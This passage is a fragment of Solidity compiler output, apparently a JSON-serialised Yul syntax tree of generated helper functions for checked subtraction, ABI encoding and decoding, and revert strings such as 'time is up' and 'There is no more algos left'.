,"src":"7700:9:10","type":""}],"returnVariables":[{"name":"tail","nativeSrc":"7715:4:10","nodeType":"YulTypedName","src":"7715:4:10","type":""}],"src":"7549:419:10"},{"body":{"nativeSrc":"8019:149:10","nodeType":"YulBlock","src":"8019:149:10","statements":[{"nativeSrc":"8029:25:10","nodeType":"YulAssignment","src":"8029:25:10","value":{"arguments":[{"name":"x","nativeSrc":"8052:1:10","nodeType":"YulIdentifier","src":"8052:1:10"}],"functionName":{"name":"cleanup_t_uint256","nativeSrc":"8034:17:10","nodeType":"YulIdentifier","src":"8034:17:10"},"nativeSrc":"8034:20:10","nodeType":"YulFunctionCall","src":"8034:20:10"},"variableNames":[{"name":"x","nativeSrc":"8029:1:10","nodeType":"YulIdentifier","src":"8029:1:10"}]},{"nativeSrc":"8063:25:10","nodeType":"YulAssignment","src":"8063:25:10","value":{"arguments":[{"name":"y","nativeSrc":"8086:1:10","nodeType":"YulIdentifier","src":"8086:1:10"}],"functionName":{"name":"cleanup_t_uint256","nativeSrc":"8068:17:10","nodeType":"YulIdentifier","src":"8068:17:10"},"nativeSrc":"8068:20:10","nodeType":"YulFunctionCall","src":"8068:20:10"},"variableNames":[{"name":"y","nativeSrc":"8063:1:10","nodeType":"YulIdentifier","src":"8063:1:10"}]},{"nativeSrc":"8097:17:10","nodeType":"YulAssignment","src":"8097:17:10","value":{"arguments":[{"name":"x","nativeSrc":"8109:1:10","nodeType":"YulIdentifier","src":"8109:1:10"},{"name":"y","nativeSrc":"8112:1:10","nodeType":"YulIdentifier","src":"8112:1:10"}],"functionName":{"name":"sub","nativeSrc":"8105:3:10","nodeType":"YulIdentifier","src":"8105:3:10"},"nativeSrc":"8105:9:10","nodeType":"YulFunctionCall","src":"8105:9:10"},"variableNames":[{"name":"diff","nativeSrc":"8097:4:10","nodeType":"YulIdentifier","src":"8097:4:10"}]},{"body":{"nativeSrc":"8139:22:10","nodeType":"YulBlock","src":"8139:22:10","statements":[{"expression":{"arguments":[],"functionName":{"name":"panic_error_0x11","nativeSrc":"8141:16:10","nodeType":"YulIdentifier","src":"8141:16:10"},"nativeSrc":"8141:18:10","nodeType":"YulFunctionCall","src":"8141:18:10"},"nativeSrc":"8141:18:10","nodeType":"YulExpressionStatement","src":"8141:18:10"}]},"condition":{"arguments":[{"name":"diff","nativeSrc":"8130:4:10","nodeType":"YulIdentifier","src":"8130:4:10"},{"name":"x","nativeSrc":"8136:1:10","nodeType":"YulIdentifier","src":"8136:1:10"}],"functionName":{"name":"gt","nativeSrc":"8127:2:10","nodeType":"YulIdentifier","src":"8127:2:10"},"nativeSrc":"8127:11:10","nodeType":"YulFunctionCall","src":"8127:11:10"},"nativeSrc":"8124:37:10","nodeType":"YulIf","src":"8124:37:10"}]},"name":"checked_sub_t_uint256","nativeSrc":"7974:194:10","nodeType":"YulFunctionDefinition","parameters":[{"name":"x","nativeSrc":"8005:1:10","nodeType":"YulTypedName","src":"8005:1:10","type":""},{"name":"y","nativeSrc":"8008:1:10","nodeType":"YulTypedName","src":"8008:1:10","type":""}],"returnVariables":[{"name":"diff","nativeSrc":"8014:4:10","nodeType":"YulTypedName","src":"8014:4:10","type":""}],"src":"7974:194:10"},{"body":{"nativeSrc":"8280:54:10","nodeType":"YulBlock","src":"8280:54:10","statements":[{"expression":{"arguments":[{"arguments":[{"name":"memPtr","nativeSrc":"8302:6:10","nodeType":"YulIdentifier","src":"8302:6:10"},{"kind":"number","nativeSrc":"8310:1:10","nodeType":"YulLiteral","src":"8310:1:10","type":"","value":"0"}],"functionName":{"name":"add","nativeSrc":"8298:3:10","nodeType":"YulIdentifier","src":"8298:3:10"},"nativeSrc":"8298:14:10","nodeType":"YulFunctionCall","src":"8298:14:10"},{"hexValue":"74696d65206973207570","kind":"string","nativeSrc":"8314:12:10","nodeType":"YulLiteral","src":"8314:12:10","type":"","value":"time is up"}],"functionName":{"name":"mstore","nativeSrc":"8291:6:10","nodeType":"YulIdentifier","src":"8291:6:10"},"nativeSrc":"8291:36:10","nodeType":"YulFunctionCall","src":"8291:36:10"},"nativeSrc":"8291:36:10","nodeType":"YulExpressionStatement","src":"8291:36:10"}]},"name":"store_literal_in_memory_9dd4894e5023a0e17c1d4a44cc5b0d7f47c7a4c69448e00312c60be60cf75bfb","nativeSrc":"8174:160:10","nodeType":"YulFunctionDefinition","parameters":[{"name":"memPtr","nativeSrc":"8272:6:10","nodeType":"YulTypedName","src":"8272:6:10","type":""}],"src":"8174:160:10"},{"body":{"nativeSrc":"8486:220:10","nodeType":"YulBlock","src":"8486:220:10","statements":[{"nativeSrc":"8496:74:10","nodeType":"YulAssignment","src":"8496:74:10","value":{"arguments":[{"name":"pos","nativeSrc":"8562:3:10","nodeType":"YulIdentifier","src":"8562:3:10"},{"kind":"number","nativeSrc":"8567:2:10","nodeType":"YulLiteral","src":"8567:2:10","type":"","value":"10"}],"functionName":{"name":"array_storeLengthForEncoding_t_string_memory_ptr_fromStack","nativeSrc":"8503:58:10","nodeType":"YulIdentifier","src":"8503:58:10"},"nativeSrc":"8503:67:10","nodeType":"YulFunctionCall","src":"8503:67:10"},"variableNames":[{"name":"pos","nativeSrc":"8496:3:10","nodeType":"YulIdentifier","src":"8496:3:10"}]},{"expression":{"arguments":[{"name":"pos","nativeSrc":"8668:3:10","nodeType":"YulIdentifier","src":"8668:3:10"}],"functionName":{"name":"store_literal_in_memory_9dd4894e5023a0e17c1d4a44cc5b0d7f47c7a4c69448e00312c60be60cf75bfb","nativeSrc":"8579:88:10","nodeType":"YulIdentifier","src":"8579:88:10"},"nativeSrc":"8579:93:10","nodeType":"YulFunctionCall","src":"8579:93:10"},"nativeSrc":"8579:93:10","nodeType":"YulExpressionStatement","src":"8579:93:10"},{"nativeSrc":"8681:19:10","nodeType":"YulAssignment","src":"8681:19:10","value":{"arguments":[{"name":"pos","nativeSrc":"8692:3:10","nodeType":"YulIdentifier","src":"8692:3:10"},{"kind":"number","nativeSrc":"8697:2:10","nodeType":"YulLiteral","src":"8697:2:10","type":"","value":"32"}],"functionName":{"name":"add","nativeSrc":"8688:3:10","nodeType":"YulIdentifier","src":"8688:3:10"},"nativeSrc":"8688:12:10","nodeType":"YulFunctionCall","src":"8688:12:10"},"variableNames":[{"name":"end","nativeSrc":"8681:3:10","nodeType":"YulIdentifier","src":"8681:3:10"}]}]},"name":"abi_encode_t_stringliteral_9dd4894e5023a0e17c1d4a44cc5b0d7f47c7a4c69448e00312c60be60cf75bfb_to_t_string_memory_ptr_fromStack","nativeSrc":"8340:366:10","nodeType":"YulFunctionDefinition","parameters":[{"name":"pos","nativeSrc":"8474:3:10","nodeType":"YulTypedName","src":"8474:3:10","type":""}],"returnVariables":[{"name":"end","nativeSrc":"8482:3:10","nodeType":"YulTypedName","src":"8482:3:10","type":""}],"src":"8340:366:10"},{"body":{"nativeSrc":"8883:248:10","nodeType":"YulBlock","src":"8883:248:10","statements":[{"nativeSrc":"8893:26:10","nodeType":"YulAssignment","src":"8893:26:10","value":{"arguments":[{"name":"headStart","nativeSrc":"8905:9:10","nodeType":"YulIdentifier","src":"8905:9:10"},{"kind":"number","nativeSrc":"8916:2:10","nodeType":"YulLiteral","src":"8916:2:10","type":"","value":"32"}],"functionName":{"name":"add","nativeSrc":"8901:3:10","nodeType":"YulIdentifier","src":"8901:3:10"},"nativeSrc":"8901:18:10","nodeType":"YulFunctionCall","src":"8901:18:10"},"variableNames":[{"name":"tail","nativeSrc":"8893:4:10","nodeType":"YulIdentifier","src":"8893:4:10"}]},{"expression":{"arguments":[{"arguments":[{"name":"headStart","nativeSrc":"8940:9:10","nodeType":"YulIdentifier","src":"8940:9:10"},{"kind":"number","nativeSrc":"8951:1:10","nodeType":"YulLiteral","src":"8951:1:10","type":"","value":"0"}],"functionName":{"name":"add","nativeSrc":"8936:3:10","nodeType":"YulIdentifier","src":"8936:3:10"},"nativeSrc":"8936:17:10","nodeType":"YulFunctionCall","src":"8936:17:10"},{"arguments":[{"name":"tail","nativeSrc":"8959:4:10","nodeType":"YulIdentifier","src":"8959:4:10"},{"name":"headStart","nativeSrc":"8965:9:10","nodeType":"YulIdentifier","src":"8965:9:10"}],"functionName":{"name":"sub","nativeSrc":"8955:3:10","nodeType":"YulIdentifier","src":"8955:3:10"},"nativeSrc":"8955:20:10","nodeType":"YulFunctionCall","src":"8955:20:10"}],"functionName":{"name":"mstore","nativeSrc":"8929:6:10","nodeType":"YulIdentifier","src":"8929:6:10"},"nativeSrc":"8929:47:10","nodeType":"YulFunctionCall","src":"8929:47:10"},"nativeSrc":"8929:47:10","nodeType":"YulExpressionStatement","src":"8929:47:10"},{"nativeSrc":"8985:139:10","nodeType":"YulAssignment","src":"8985:139:10","value":{"arguments":[{"name":"tail","nativeSrc":"9119:4:10","nodeType":"YulIdentifier","src":"9119:4:10"}],"functionName":{"name":"abi_encode_t_stringliteral_9dd4894e5023a0e17c1d4a44cc5b0d7f47c7a4c69448e00312c60be60cf75bfb_to_t_string_memory_ptr_fromStack","nativeSrc":"8993:124:10","nodeType":"YulIdentifier","src":"8993:124:10"},"nativeSrc":"8993:131:10","nodeType":"YulFunctionCall","src":"8993:131:10"},"variableNames":[{"name":"tail","nativeSrc":"8985:4:10","nodeType":"YulIdentifier","src":"8985:4:10"}]}]},"name":"abi_encode_tuple_t_stringliteral_9dd4894e5023a0e17c1d4a44cc5b0d7f47c7a4c69448e00312c60be60cf75bfb__to_t_string_memory_ptr__fromStack_reversed","nativeSrc":"8712:419:10","nodeType":"YulFunctionDefinition","parameters":[{"name":"headStart","nativeSrc":"8863:9:10","nodeType":"YulTypedName","src":"8863:9:10","type":""}],"returnVariables":[{"name":"tail","nativeSrc":"8878:4:10","nodeType":"YulTypedName","src":"8878:4:10","type":""}],"src":"8712:419:10"},{"body":{"nativeSrc":"9243:71:10","nodeType":"YulBlock","src":"9243:71:10","statements":[{"expression":{"arguments":[{"arguments":[{"name":"memPtr","nativeSrc":"9265:6:10","nodeType":"YulIdentifier","src":"9265:6:10"},{"kind":"number","nativeSrc":"9273:1:10","nodeType":"YulLiteral","src":"9273:1:10","type":"","value":"0"}],"functionName":{"name":"add","nativeSrc":"9261:3:10","nodeType":"YulIdentifier","src":"9261:3:10"},"nativeSrc":"9261:14:10","nodeType":"YulFunctionCall","src":"9261:14:10"},{"hexValue":"5468657265206973206e6f206d6f726520616c676f73206c656674","kind":"string","nativeSrc":"9277:29:10","nodeType":"YulLiteral","src":"9277:29:10","type":"","value":"There is no more algos left"}],"functionName":{"name":"mstore","nativeSrc":"9254:6:10","nodeType":"YulIdentifier","src":"9254:6:10"},"nativeSrc":"9254:53:10","nodeType":"YulFunctionCall","src":"9254:53:10"},"nativeSrc":"9254:53:10","nodeType":"YulExpressionStatement","src":"9254:53:10"}]},"name":"store_literal_in_memory_db1bb1de83edabd500c0014fce354e49c1de3e4c849d352fedfbf22c6445e5c3","nativeSrc":"9137:177:10","nodeType":"YulFunctionDefinition","parameters":[{"name":"memPtr","nativeSrc":"9235:6:10","nodeType":"YulTypedName","src":"9235:6:10","type":""}],"src":"9137:177:10"},{"body":{"nativeSrc":"9466:220:10","nodeType":"YulBlock","src":"9466:220:10","statements":[{"nativeSrc":"9476:74:10","nodeType":"YulAssignment","src":"9476:74:10","value":{"arguments":[{"name":"pos","nativeSrc":"9542:3:10","nodeType":"YulIdentifier","src":"9542:3:10"},{"kind":"number","nativeSrc":"9547:2:10","nodeType":"YulLiteral","src":"9547:2:10","type":"","value":"27"}],"functionName":{"name":"array_storeLengthForEncoding_t_string_memory_ptr_fromStack","nativeSrc":"9483:58:10","nodeType":"YulIdentifier","src":"9483:58:10"},"nativeSrc":"9483:67:10","nodeType":"YulFunctionCall","src":"9483:67:10"},"variableNames":[{"name":"pos","nativeSrc":"9476:3:10","nodeType":"YulIdentifier","src":"9476:3:10"}]},{"expression":{"arguments":[{"name":"pos","nativeSrc":"9648:3:10","nodeType":"YulIdentifier","src":"9648:3:10"}],"functionName":{"name":"store_literal_in_memory_db1bb1de83edabd500c0014fce354e49c1de3e4c849d352fedfbf22c6445e5c3","nativeSrc":"9559:88:10","nodeType":"YulIdentifier","src":"9559:88:10"},"nativeSrc":"9559:93:10","nodeType":"YulFunctionCall","src":"9559:93:10"},"nativeSrc":"9559:93:10","nodeType":"YulExpressionStatement","src":"9559:93:10"},{"nativeSrc":"9661:19:10","nodeType":"YulAssignment","src":"9661:19:10","value":{"arguments":[{"name":"pos","nativeSrc":"9672:3:10","nodeType":"YulIdentifier","src":"9672:3:10"},{"kind":"number","nativeSrc":"9677:2:10","nodeType":"YulLiteral","src":"9677:2:10","type":"","value":"32"}],"functionName":{"name":"add","nativeSrc":"9668:3:10","nodeType":"YulIdentifier","src":"9668:3:10"},"nativeSrc":"9668:12:10","nodeType":"YulFunctionCall","src":"9668:12:10"},"variableNames":[{"name":"end","nativeSrc":"9661:3:10","nodeType":"YulIdentifier","src":"9661:3:10"}]}]},"name":"abi_encode_t_stringliteral_db1bb1de83edabd500c0014fce354e49c1de3e4c849d352fedfbf22c6445e5c3_to_t_string_memory_ptr_fromStack","nativeSrc":"9320:366:10","nodeType":"YulFunctionDefinition","parameters":[{"name":"pos","nativeSrc":"9454:3:10","nodeType":"YulTypedName","src":"9454:3:10","type":""}],"returnVariables":[{"name":"end","nativeSrc":"9462:3:10","nodeType":"YulTypedName","src":"9462:3:10","type":""}],"src":"9320:366:10"},{"body":{"nativeSrc":"9863:248:10","nodeType":"YulBlock","src":"9863:248:10","statements":[{"nativeSrc":"9873:26:10","nodeType":"YulAssignment","src":"9873:26:10","value":{"arguments":[{"name":"headStart","nativeSrc":"9885:9:10","nodeType":"YulIdentifier","src":"9885:9:10"},{"kind":"number","nativeSrc":"9896:2:10","nodeType":"YulLiteral","src":"9896:2:10","type":"","value":"32"}],"functionName":{"name":"add","nativeSrc":"9881:3:10","nodeType":"YulIdentifier","src":"9881:3:10"},"nativeSrc":"9881:18:10","nodeType":"YulFunctionCall","src":"9881:18:10"},"variableNames":[{"name":"tail","nativeSrc":"9873:4:10","nodeType":"YulIdentifier","src":"9873:4:10"}]},{"expression":{"arguments":[{"arguments":[{"name":"headStart","nativeSrc":"9920:9:10","nodeType":"YulIdentifier","src":"9920:9:10"},{"kind":"number","nativeSrc":"9931:1:10","nodeType":"YulLiteral","src":"9931:1:10","type":"","value":"0"}],"functionName":{"name":"add","nativeSrc":"9916:3:10","nodeType":"YulIdentifier","src":"9916:3:10"},"nativeSrc":"9916:17:10","nodeType":"YulFunctionCall","src":"9916:17:10"},{"arguments":[{"name":"tail","nativeSrc":"9939:4:10","nodeType":"YulIdentifier","src":"9939:4:10"},{"name":"headStart","nativeSrc":"9945:9:10","nodeType":"YulIdentifier","src":"9945:9:10"}],"functionName":{"name":"sub","nativeSrc":"9935:3:10","nodeType":"YulIdentifier","src":"9935:3:10"},"nativeSrc":"9935:20:10","nodeType":"YulFunctionCall","src":"9935:20:10"}],"functionName":{"name":"mstore","nativeSrc":"9909:6:10","nodeType":"YulIdentifier","src":"9909:6:10"},"nativeSrc":"9909:47:10","nodeType":"YulFunctionCall","src":"9909:47:10"},"nativeSrc":"9909:47:10","nodeType":"YulExpressionStatement","src":"9909:47:10"},{"nativeSrc":"9965:139:10","nodeType":"YulAssignment","src":"9965:139:10","value":{"arguments":[{"name":"tail","nativeSrc":"10099:4:10","nodeType":"YulIdentifier","src":"10099:4:10"}],"functionName":{"name":"abi_encode_t_stringliteral_db1bb1de83edabd500c0014fce354e49c1de3e4c849d352fedfbf22c6445e5c3_to_t_string_memory_ptr_fromStack","nativeSrc":"9973:124:10","nodeType":"YulIdentifier","src":"9973:124:10"},"nativeSrc":"9973:131:10","nodeType":"YulFunctionCall","src":"9973:131:10"},"variableNames":[{"name":"tail","nativeSrc":"9965:4:10","nodeType":"YulIdentifier","src":"9965:4:10"}]}]},"name":"abi_encode_tuple_t_stringliteral_db1bb1de83edabd500c0014fce354e49c1de3e4c849d352fedfbf22c6445e5c3__to_t_string_memory_ptr__fromStack_reversed","nativeSrc":"9692:419:10","nodeType":"YulFunctionDefinition","parameters":[{"name":"headStart","nativeSrc":"9843:9:10","nodeType":"YulTypedName","src":"9843:9:10","type":""}],"returnVariables":[{"name":"tail","nativeSrc":"9858:4:10","nodeType":"YulTypedName","src":"9858:4:10","type":""}],"src":"9692:419:10"},{"body":{"nativeSrc":"10271:288:10","nodeType":"YulBlock","src":"10271:288:10","statements":[{"nativeSrc":"10281:26:10","nodeType":"YulAssignment","src":"10281:26:10","value":{"arguments":[{"name":"headStart","nativeSrc":"10293:9:10","nodeType":"YulIdentifier","src":"10293:9:10"},{"kind":"number","nativeSrc":"10304:2:10","nodeType":"YulLiteral","src":"10304:2:10","type":"","value":"96"}],"functionName":{"name":"add","nativeSrc":"10289:3:10","nodeType":"YulIdentifier","src":"10289:3:10"},"nativeSrc":"10289:18:10","nodeType":"YulFunctionCall","src":"10289:18:10"},"variableNames":[{"name":"tail","nativeSrc":"10281:4:10","nodeType":"YulIdentifier","src":"10281:4:10"}]},{"expression":{"arguments":[{"name":"value0","nativeSrc":"10361:6:10","nodeType":"YulIdentifier","src":"10361:6:10"},{"arguments":[{"name":"headStart","nativeSrc":"10374:9:10","nodeType":"YulIdentifier","src":"10374:9:10"},{"kind":"number","nativeSrc":"10385:1:10","nodeType":"YulLiteral","src":"10385:1:10","type":"","value":"0"}],"functionName":{"name":"add","nativeSrc":"10370:3:10","nodeType":"YulIdentifier","src":"10370:3:10"},"nativeSrc":"10370:17:10","nodeType":"YulFunctionCall","src":"10370:17:10"}],"functionName":{"name":"abi_encode_t_uint256_to_t_uint256_fromStack","nativeSrc":"10317:43:10","nodeType":"YulIdentifier","src":"10317:43:10"},"nativeSrc":"10317:71:10","nodeType":"YulFunctionCall","src":"10317:71:10"},"nativeSrc":"10317:71:10","nodeType":"YulExpressionStatement","src":"10317:71:10"},{"expression":{"arguments":[{"name":"value1","nativeSrc":"10442:6:10","nodeType":"YulIdentifier","src":"10442:6:10"},{"arguments":[{"name":"headStart","nativeSrc":"10455:9:10","nodeType":"YulIdentifier","src":"10455:9:10"},{"kind":"number","nativeSrc":"10466:2:10","nodeType":"YulLiteral","src":"10466:2:10","type":"","value":"32"}],"functionName":{"name":"add","nativeSrc":"10451:3:10","nodeType":"YulIdentifier","src":"10451:3:10"},"nativeSrc":"10451:18:10","nodeType":"YulFunctionCall","src":"10451:18:10"}],"functionName":{"name":"abi_encode_t_address_to_t_address_fromStack","nativeSrc":"10398:43:10","nodeType":"YulIdentifier","src":"10398:43:10"},"nativeSrc":"10398:72:10","nodeType":"YulFunctionCall","src":"10398:72:10"},"nativeSrc":"10398:72:10","nodeType":"YulExpressionStatement","src":"10398:72:10"},{"expression":{"arguments":[{"name":"value2","nativeSrc":"10524:6:10","nodeType":"YulIdentifier","src":"10524:6:10"},{"arguments":[{"name":"headStart","nativeSrc":"10537:9:10","nodeType":"YulIdentifier","src":"10537:9:10"},{"kind":"number","nativeSrc":"10548:2:10","nodeType":"YulLiteral","src":"10548:2:10","type":"","value":"64"}],"functionName":{"name":"add","nativeSrc":"10533:3:10","nodeType":"YulIdentifier","src":"10533:3:10"},"nativeSrc":"10533:18:10","nodeType":"YulFunctionCall","src":"10533:18:10"}],"functionName":{"name":"abi_encode_t_uint256_to_t_uint256_fromStack","nativeSrc":"10480:43:10","nodeType":"YulIdentifier","src":"10480:43:10"},"nativeSrc":"10480:72:10","nodeType":"YulFunctionCall","src":"10480:72:10"},"nativeSrc":"10480:72:10","nodeType":"YulExpressionStatement","src":"10480:72:10"}]},"name":"abi_encode_tuple_t_uint256_t_address_t_uint256__to_t_uint256_t_address_t_uint256__fromStack_reversed","nativeSrc":"10117:442:10","nodeType":"YulFunctionDefinition","parameters":[{"name":"headStart","nativeSrc":"10227:9:10","nodeType":"YulTypedName","src":"10227:9:10","type":""},{"name":"value2","nativeSrc":"10239:6:10","nodeType":"YulTypedName","src":"10239:6:10","type":""},{"name":"value1","nativeSrc":"10247:6:10","nodeType":"YulTypedName","src":"10247:6:10","type":""},{"name":"value0","nativeSrc":"10255:6:10","nodeType":"YulTypedName","src":"10255:6:10","type":""}],"returnVariables":[{"name":"tail","nativeSrc":"10266:4:10","nodeType":"YulTypedName","src":"10266:4:10","type":""}],"src":"10117:442:10"},{"body":{"nativeSrc":"10628:80:10","nodeType":"YulBlock","src":"10628:80:10","statements":[{"nativeSrc":"10638:22:10","nodeType":"YulAssignment","src":"10638:22:10","value":{"arguments":[{"name":"offset","nativeSrc":"10653:6:10","nodeType":"YulIdentifier","src":"10653:6:10"}],"functionName":{"name":"mload","nativeSrc":"10647:5:10","nodeType":"YulIdentifier","src":"10647:5:10"},"nativeSrc":"10647:13:10","nodeType":"YulFunctionCall","src":"10647:13:10"},"variableNames":[{"name":"value","nativeSrc":"10638:5:10","nodeType":"YulIdentifier","src":"10638:5:10"}]},{"expression":{"arguments":[{"name":"value","nativeSrc":"10696:5:10","nodeType":"YulIdentifier","src":"10696:5:10"}],"functionName":{"name":"validator_revert_t_uint256","nativeSrc":"10669:26:10","nodeType":"YulIdentifier","src":"10669:26:10"},"nativeSrc":"10669:33:10","nodeType":"YulFunctionCall","src":"10669:33:10"},"nativeSrc":"10669:33:10","nodeType":"YulExpressionStatement","src":"10669:33:10"}]},"name":"abi_decode_t_uint256_fromMemory","nativeSrc":"10565:143:10","nodeType":"YulFunctionDefinition","parameters":[{"name":"offset","nativeSrc":"10606:6:10","nodeType":"YulTypedName","src":"10606:6:10","type":""},{"name":"end","nativeSrc":"10614:3:10","nodeType":"YulTypedName","src":"10614:3:10","type":""}],"returnVariables":[{"name":"value","nativeSrc":"10622:5:10","nodeType":"YulTypedName","src":"10622:5:10","type":""}],"src":"10565:143:10"},{"body":{"nativeSrc":"10791:274:10","nodeType":"YulBlock","src":"10791:274:10","statements":[{"body":{"nativeSrc":"10837:83:10","nodeType":"YulBlock","src":"10837:83:10","statements":[{"expression":{"arguments":[],"functionName":{"name":"revert_error_dbdddcbe895c83990c08b3492a0e83918d802a52331272ac6fdb6a7c4aea3b1b","nativeSrc":"10839:77:10","nodeType":"YulIdentifier","src":"10839:77:10"},"nativeSrc":"10839:79:10","nodeType":"YulFunctionCall","src":"10839:79:10"},"nativeSrc":"10839:79:10","nodeType":"YulExpressionStatement","src":"10839:79:10"}]},"condition":{"arguments":[{"arguments":[{"name":"dataEnd","nativeSrc":"10812:7:10","nodeType":"YulIdentifier","src":"10812:7:10"},{"name":"headStart","nativeSrc":"10821:9:10","nodeType":"YulIdentifier","src":"10821:9:10"}],"functionName":{"name":"sub","nativeSrc":"10808:3:10","nodeType":"YulIdentifier","src":"10808:3:10"},"nativeSrc":"10808:23:10","nodeType":"YulFunctionCall","src":"10808:23:10"},{"kind":"number","nativeSrc":"10833:2:10","nodeType":"YulLiteral","src":"10833:2:10","type":"","value":"32"}],"functionName":{"name":"slt","nativeSrc":"10804:3:10","nodeType":"YulIdentifier","src":"10804:3:10"},"nativeSrc":"10804:32:10","nodeType":"YulFunctionCall","src":"10804:32:10"},"nativeSrc":"10801:119:10","nodeType":"YulIf","src":"10801:119:10"},{"nativeSrc":"10930:128:10","nodeType":"YulBlock","src":"10930:128:10","statements":[{"nativeSrc":"10945:15:10","nodeType":"YulVariableDeclaration","src":"10945:15:10","value":{"kind":"number","nativeSrc":"10959:1:10","nodeType":"YulLiteral","src":"10959:1:10","type":"","value":"0"},"variables":[{"name":"offset","nativeSrc":"10949:6:10","nodeType":"YulTypedName","src":"10949:6:10","type":""}]},{"nativeSrc":"10974:74:10","nodeType":"YulAssignment","src":"10974:74:10","value":{"arguments":[{"arguments":[{"name":"headStart","nativeSrc":"11020:9:10","nodeType":"YulIdentifier","src":"11020:9:10"},{"name":"offset","nativeSrc":"11031:6:10","nodeType":"YulIdentifier","src":"11031:6:10"}],"functionName":{"name":"add","nativeSrc":"11016:3:10","nodeType":"YulIdentifier","src":"11016:3:10"},"nativeSrc":"11016:22:10","nodeType":"YulFunctionCall","src":"11016:22:10"},{"name":"dataEnd","nativeSrc":"11040:7:10","nodeType":"YulIdentifier","src":"11040:7:10"}],"functionName":{"name":"abi_decode_t_uint256_fromMemory","nativeSrc":"10984:31:10","nodeType":"YulIdentifier","src":"10984:31:10"},"nativeSrc":"10984:64:10","nodeType":"YulFunctionCall","src":"10984:64:10"},"variableNames":[{"name":"value0","nativeSrc":"10974:6:10","nodeType":"YulIdentifier","src":"10974:6:10"}]}]}]},"name":"abi_decode_tuple_t_uint256_fromMemory","nativeSrc":"10714:351:10","nodeType":"YulFunctionDefinition","parameters":[{"name":"headStart","nativeSrc":"10761:9:10","nodeType":"YulTypedName","src":"10761:9:10","type":""},{"name":"dataEnd","nativeSrc":"10772:7:10","nodeType":"YulTypedName","src":"10772:7:10","type":""}],"returnVariables":[{"name":"value0","nativeSrc":"10784:6:10","nodeType":"YulTypedName","src":"10784:6:10","type":""}],"src":"10714:351:10"},{"body":{"nativeSrc":"11197:206:10","nodeType":"YulBlock","src":"11197:206:10","statements":[{"nativeSrc":"11207:26:10","nodeType":"YulAssignment","src":"11207:26:10","value":{"arguments":[{"name":"headStart","nativeSrc":"11219:9:10","nodeType":"YulIdentifier","src":"11219:9:10"},{"kind":"number","nativeSrc":"11230:2:10","nodeType":"YulLiteral","src":"11230:2:10","type":"","value":"64"}],"functionName":{"name":"add","nativeSrc":"11215:3:10","nodeType":"YulIdentifier","src":"11215:3:10"},"nativeSrc":"11215:18:10","nodeType":"YulFunctionCall","src":"11215:18:10"},"variableNames":[{"name":"tail","nativeSrc":"11207:4:10","nodeType":"YulIdentifier","src":"11207:4:10"}]},{"expression":{"arguments":[{"name":"value0","nativeSrc":"11287:6:10","nodeType":"YulIdentifier","src":"11287:6:10"},{"arguments":[{"name":"headStart","nativeSrc":"11300:9:10","nodeType":"YulIdentifier","src":"11300:9:10"},{"kind":"number","nativeSrc":"11311:1:10","nodeType":"YulLiteral","src":"11311:1:10","type":"","value":"0"}],"functionName":{"name":"add","nativeSrc":"11296:3:10","nodeType":"YulIdentifier","src":"11296:3:10"},"nativeSrc":"11296:17:10","nodeType":"YulFunctionCall","src":"11296:17:10"}],"functionName":{"name":"abi_encode_t_uint256_to_t_uint256_fromStack","nativeSrc":"11243:43:10","nodeType":"YulIdentifier","src":"11243:43:10"},"nativeSrc":"11243:71:10","nodeType":"YulFunctionCall","src":"11243:71:10"},"nativeSrc":"11243:71:10","nodeType":"YulExpressionStatement","src":"11243:71:10"},{"expression":{"arguments":[{"name":"value1","nativeSrc":"11368:6:10","nodeType":"YulIdentifier","src":"11368:6:10"},{"arguments":[{"name":"headStart","nativeSrc":"11381:9:10","nodeType":"YulIdentifier","src":"11381:9:10"},{"kind":"number","nativeSrc":"11392:2:10","nodeType":"YulLiteral","src":"11392:2:10","type":"","value":"32"}],"functionName":{"name":"add","nativeSrc":"11377:3:10","nodeType":"YulIdentifier","src":"11377:3:10"},"nativeSrc":"11377:18:10","nodeType":"YulFunctionCall","src":"11377:18:10"}],"functionName":{"name":"abi_encode_t_address_to_t_address_fromStack","nativeSrc":"11324:43:10","nodeType":"YulIdentifier","src":"11324:43:10"},"nativeSrc":"11324:72:10","nodeType":"YulFunctionCall","src":"11324:72:10"},"nativeSrc":"11324:72:10","nodeType":"YulExpressionStatement","src":"11324:72:10"}]},"name":"abi_encode_tuple_t_uint256_t_address__to_t_uint256_t_address__fromStack_reversed","nativeSrc":"11071:332:10","nodeType":"YulFunctionDefinition","parameters":[{"name":"headStart","nativeSrc":"11161:9:10","nodeType":"YulTypedName","src":"11161:9:10","type":""},{"name":"value1","nativeSrc":"11173:6:10","nodeType":"YulTypedName","src":"11173:6:10","type":""},{"name":"value0","nativeSrc":"11181:6:10","nodeType":"YulTypedName","src":"11181:6:10","type":""}],"returnVariables":[{"name":"tail","nativeSrc":"11192:4:10","nodeType":"YulTypedName","src":"11192:4:10","type":""}],"src":"11071:332:10"},{"body":{"nativeSrc":"11591:371:10","nodeType":"YulBlock","src":"11591:371:10","statements":[{"nativeSrc":"11601:27:10","nodeType":"YulAssignment","src":"11601:27:10","value":{"arguments":[{"name":"headStart","nativeSrc":"11613:9:10","nodeType":"YulIdentifier","src":"11613:9:10"},{"kind":"number","nativeSrc":"11624:3:10","nodeType":"YulLiteral","src":"11624:3:10","type":"","value":"128"}],"functionName":{"name":"add","nativeSrc":"11609:3:10","nodeType":"YulIdentifier","src":"11609:3:10"},"nativeSrc":"11609:19:10","nodeType":"YulFunctionCall","src":"11609:19:10"},"variableNames":[{"name":"tail","nativeSrc":"11601:4:10","nodeType":"YulIdentifier","src":"11601:4:10"}]},{"expression":{"arguments":[{"name":"value0","nativeSrc":"11682:6:10","nodeType":"YulIdentifier","src":"11682:6:10"},{"arguments":[{"name":"headStart","nativeSrc":"11695:9:10","nodeType":"YulIdentifier","src":"11695:9:10"},{"kind":"number","nativeSrc":"11706:1:10","nodeType":"YulLiteral","src":"11706:1:10","type":"","value":"0"}],"functionName":{"name":"add","nativeSrc":"11691:3:10","nodeType":"YulIdentifier","src":"11691:3:10"},"nativeSrc":"11691:17:10","nodeType":"YulFunctionCall","src":"11691:17:10"}],"functionName":{"name":"abi_encode_t_uint256_to_t_uint256_fromStack","nativeSrc":"11638:43:10","nodeType":"YulIdentifier","src":"11638:43:10"},"nativeSrc":"11638:71:10","nodeType":"YulFunctionCall","src":"11638:71:10"},"nativeSrc":"11638:71:10","nodeType":"YulExpressionStatement","src":"11638:71:10"},{"expression":{"arguments":[{"name":"value1","nativeSrc":"11763:6:10","nodeType":"YulIdentifier","src":"11763:6:10"},{"arguments":[{"name":"headStart","nativeSrc":"11776:9:10","nodeType":"YulIdentifier","src":"11776: